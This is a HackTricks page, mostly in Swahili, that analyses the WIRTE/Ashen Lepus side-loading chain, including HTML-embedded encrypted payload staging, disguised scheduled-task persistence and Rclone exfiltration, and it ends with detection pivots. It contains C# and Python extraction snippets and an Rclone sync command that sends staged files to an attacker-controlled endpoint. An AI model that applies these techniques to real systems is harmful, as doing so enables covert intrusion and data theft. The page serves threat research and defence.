# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) alitumia muundo unaorudiwa unaounganisha DLL sideloading, staged HTML payloads, na modular .NET backdoors ili kudumu ndani ya mitandao ya ubalozi ya Mashariki ya Kati. Tekniku hii inaweza kutumika tena na operator yeyote kwa sababu inategemea:

- **Archive-based social engineering**: PDFs zisizo hatari zinaelekeza walengwa kuvuta archive ya RAR kutoka kwenye tovuti ya kushiriki faili. Archive inajumuisha EXE ya muonekano wa kweli ya document viewer, DLL hatari iliyoitwa kwa jina la maktaba ya kuaminika (mfano, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na `Document.pdf` ya kuonesha.
- **DLL search order abuse**: lengo linabonyeza mara mbili EXE, Windows hutatua import ya DLL kutoka kwenye directory ya sasa, na loader hatari (AshenLoader) inatekelezwa ndani ya process inayotolewa kuaminiwa wakati PDF ya kuonesha inafunguka ili kuepusha shaka.
- **Living-off-the-land staging**: kila hatua zinazofuata (AshenStager → AshenOrchestrator → modules) zinahifadhiwa nje ya disk hadi zinapotakiwa, zikitolewa kama encrypted blobs zilizofichwa ndani ya majibu ya HTML ambayo vinginevyo ni zisizo hatari.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE inafanya side-load ya AshenLoader, ambayo hufanya host recon, inaifunga kwa AES-CTR, na kuipost ndani ya parameters zinazozunguka kama `token=`, `id=`, `q=`, au `auth=` kwa njia zinazofanana na API (mfano, `/api/v2/account`).
2. **HTML extraction**: C2 hutoa tu hatua inayofuata wakati IP ya mteja ina geolocate kwa mkoa la lengo na `User-Agent` inafanana na implant, ikichanganya sandboxes. Wakati ukaguzi unapita mwili wa HTTP una `<headerp>...</headerp>` blob yenye Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager inatumiwa pamoja na binary halali nyingine inayofanya import `wtsapi32.dll`. Nakala hatari iliyochomwa ndani ya binary inachukua HTML zaidi, wakati huu ikikatakata `<article>...</article>` ili kurejesha AshenOrchestrator.
4. **AshenOrchestrator**: controller modular .NET inayotafsiri config ya JSON iliyobase64. Mashamba ya config `tg` na `au` yanachanganwa/kuhashiwa kuwa AES key, ambayo ina-decrypt `xrk`. Bytes zinazotokana zinatumika kama XOR key kwa kila module blob inayopatikana baadae.
5. **Module delivery**: kila module inaelezewa kupitia maoni ya HTML yanayomwelekeza parser kwa tag yoyote, kuvunja sheria za static zinazotafuta tu `<headerp>` au `<article>`. Modules zinajumuisha persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).

### Mfano wa Kuchambua Kontena la HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Hata kama walinzi watazuia au kuondoa kipengele maalum, operator anahitaji tu kubadilisha tag iliyoashiriwa katika HTML comment ili kuendelea na utoaji.

### Msaidizi wa Uchimbaji wa Haraka (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Utafiti wa hivi karibuni wa HTML smuggling (Talos) unaonyesha payload zilizofichwa kama Base64 strings ndani ya `<script>` blocks katika attachments za HTML na zilizotafsiriwa kwa kutumia JavaScript wakati wa runtime. Njia ile ile inaweza kutumika tena kwa majibu ya C2: weka blobs zilizofichwa kwa encryption ndani ya tag ya script (au elementi nyingine ya DOM) na uzitafsiri kwa memory kabla ya AES/XOR, ikifanya ukurasa uonekane kama HTML ya kawaida. Talos pia inaonyesha obfuscation ya tabaka (renaming ya identifiers pamoja na Base64/Caesar/AES) ndani ya script tags, ambayo inaendana vizuri na HTML-staged C2 blobs.

## Recent Variant Notes (2024-2025)

- Check Point iliona campaigns za WIRTE mwaka 2024 ambazo zilitegemea sideloading inayotegemea archives lakini zilitumia `propsys.dll` (stagerx64) kama stage ya kwanza. Stager ilitafsiri payload inayofuatia kwa Base64 + XOR (key `53`), ilituma HTTP requests na `User-Agent` iliyowekwa hardcoded, na ikachambua blobs zilizofichwa zilizowekwa kati ya HTML tags. Katika tawi moja, stage ilijengwa tena kutoka kwa orodha ndefu ya strings za IP zilizowekwa ambazo zilitatfiwa kwa `RtlIpv4StringToAddressA`, kisha zikachanganishwa kuwa bytes za payload.
- OWN-CERT ilitandika tooling ya awali ya WIRTE ambapo dropper iliyosideloaded `wtsapi32.dll` ililinda strings kwa Base64 + TEA na kutumia jina la DLL yenyewe kama key ya decryption, kisha XOR/Base64-ila data ya kitambulisho cha host kabla ya kuituma kwa C2.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: loaders za sasa zinaingiza 256-bit keys pamoja na nonces (mfano, `{9a 20 51 98 ...}`) na hiari zinaongeza layer ya XOR kutumia strings kama `msasn1.dll` kabla/baada ya decryption.
- **Key material variations**: loaders za awali zililitumia Base64 + TEA kulinda strings zilizojazwa ndani, na key ya decryption ilitokana na jina la DLL iliyo hatari (mfano, `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: staging servers zimegawanywa kwa zana, zikiwa zimekaa kwenye ASNs tofauti, na wakati mwingine zikiwa mbelekwa na subdomains zinazoonekana halali, hivyo kuchoma stage moja hakufichui zingine.
- **Recon smuggling**: data iliyoorodheshwa sasa inajumuisha orodha za Program Files ili kutambua apps zenye thamani kubwa na daima imefichwa kabla haijaondoka kwenye host.
- **URI churn**: query parameters na REST paths hubadilika kati ya campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), ikiharibu detections zilizo tete.
- **User-Agent pinning + safe redirects**: miundombinu ya C2 inajibu tu kwa strings za UA sahihi; vinginevyo inarudisha kwa tovuti za habari/afya zisizo za hatari ili kuingia mchanganyiko.
- **Gated delivery**: servers zimewekwa geo-fenced na kujibu tu implants halisi. Wateja wasioidhinishwa wanapokea HTML isiyoibua shaka.

## Persistence & Execution Loop

AshenStager inaweka scheduled tasks zinazojipatia muonekano wa kazi za matengenezo ya Windows na zinaendesha kupitia `svchost.exe`, kwa mfano:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Tasks hizi zinaanzisha tena mnyororo wa sideloading wakati wa boot au kwa interval, zikihakikisha AshenOrchestrator inaweza kuomba modules mpya bila kuandika tena disk.

## Using Benign Sync Clients for Exfiltration

Operators wameweka nyaraka za kifalme ndani ya `C:\Users\Public` (inakiswauliwa na kila mtu na isiyoibua shaka) kupitia module maalum, kisha wanapakua binary halali ya [Rclone](https://rclone.org/) ili kusynchronize directory hiyo na storage inayoendeshwa na mwindikaji. Unit42 inaonyesha hii ni mara ya kwanza muumizaji huyu ameonekana akitumia Rclone kwa exfiltration, ikifuatana na mwelekeo mkubwa wa kutumia tooling halali za sync ili kujificha ndani ya trafiki ya kawaida:

1. Stage: nakili/akusanya faili za lengo ndani ya `C:\Users\Public\{campaign}\`.
2. Configure: tuma config ya Rclone inayomwelekeza kwenye endpoint ya HTTPS inayoendeshwa na mwindaji (mfano, `api.technology-system[.]com`).
3. Sync: endesha `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ili trafiki iwe inafanana na backups za kawaida za cloud.

Kwa kuwa Rclone inatumika sana kwa workflows halali za backup, watetezi wanapaswa kuzingatia utekelezaji usiotabirika (binaries mpya, remotes zisizo za kawaida, au syncing ghafla ya `C:\Users\Public`).

## Detection Pivots

- Onyesha tahadhari kwa processes zilizosigned ambazo ghafla zinapakia DLLs kutoka kwenye paths zinazoweza kuandikwa na mtumiaji (vigezo vya Procmon + `Get-ProcessMitigation -Module`), hasa wakati majina ya DLL yanatangamana na `netutils`, `srvcli`, `dwampi`, au `wtsapi32`.
- Chunguza majibu ya HTTPS yenye mashaka kwa **large Base64 blobs embedded inside unusual tags** au zilizoanzikwa na maoni ya `<!-- TAG: <xyz> -->`.
- Panua utafutaji wa HTML kwa **Base64 strings inside `<script>` blocks** (mtindo wa HTML smuggling staging) ambazo zinafutwa kupitia JavaScript kabla ya usindikaji wa AES/XOR.
- Tafuta **scheduled tasks** zinazokimbia `svchost.exe` na arguments ambazo si za service au zinarejea kwenye directories za dropper.
- Fuata **C2 redirects** ambazo zinarejesha payloads tu kwa strings za `User-Agent` kamili na vinginevyo zinarejea kwa domains halisi za habari/afya.
- Simamia kutokea kwa binaries za **Rclone** nje ya maeneo yanayosimamiwa na IT, faili mpya za `rclone.conf`, au kazi za sync zinazoleta kutoka directories za staging kama `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
